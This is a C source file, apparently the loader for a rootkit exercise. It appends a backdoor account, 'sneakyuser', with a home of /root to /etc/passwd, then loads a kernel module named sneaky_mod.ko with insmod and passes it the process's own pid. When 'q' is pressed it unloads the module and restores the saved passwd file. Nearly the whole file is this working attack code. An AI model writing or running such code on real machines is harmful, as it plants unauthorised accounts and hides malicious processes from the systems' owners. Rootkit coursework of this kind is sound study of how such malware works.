#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>
// #include <errno.h>
#include <unistd.h>
#include <string.h>


int main(int argc, char* argv[]) {
	// print the pid of sneaky process
	printf("sneaky_process pid = %d\n", getpid());
	int sys_status = 0;
	// command = cp /etc/passwd /tmp/passwd
	const char* command_init = "cp /etc/passwd /tmp/passwd";
	sys_status = system(command_init);
	// printf("cp /etc/passwd /tmp/passwd\n");
	if (sys_status == -1) {
		fprintf(stderr, "%s", "system()\n");
	}
	int open_etc = open("/etc/passwd", O_RDWR);
	
	char buffer[10000];
	size_t read_etc = read(open_etc, buffer, sizeof(buffer));
	if (read_etc < 0) {
		fprintf(stderr, "%s", "loading: cannot read /etc/passwd!\n");
	}
	// printf("size read(/etc/passwd) is %zd\n", read_etc);
	const char* new = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
	int add_new = dprintf(open_etc, "%s", new);
	if (add_new < 0) {
		fprintf(stderr, "%s", "loading: cannot add new authentification line to /etc/passwd!\n");
	}
	close(open_etc);
	// printf("added new line to /etc/passwd.......\n");
	char sneaky_process_pid[64];
	memset(sneaky_process_pid, 0, sizeof(sneaky_process_pid));
	sprintf(sneaky_process_pid, "sneaky_process_pid=%d", getpid());
	char command_load[256];
	memset(command_load, 0, sizeof(command_load));
	strcpy(command_load, "insmod sneaky_mod.ko ");
	// const char* temp = sneaky_process_pid;
	strcat(command_load, sneaky_process_pid);
	// printf("command_load = %s\n", command_load);

	//now load sneaky using system call
	sys_status = system(command_load);
	if (sys_status == -1) {
		fprintf(stderr, "%s", "system()\n");
	}
	// printf("sneaky modelu being loaded\n");
	printf("SNEAKY.........:\n");
	while (1) {
    	char input;
    	
    	input = getchar();
    	if (input == 'q') {
    		const char* command_unload = "rmmod sneaky_mod.ko";
    		sys_status = system(command_unload);
    		if (sys_status == -1) {
				fprintf(stderr, "%s", "system()\n");
			}
    		const char* command_exit = "cp /tmp/passwd /etc/passwd";
			sys_status = system(command_exit);
			if (sys_status == -1) {
				fprintf(stderr, "%s", "system()\n");
			}
			// printf("cp /tmp/passwd /etc/passwd\n");
			break;
    	}
	}
    return EXIT_SUCCESS;
}
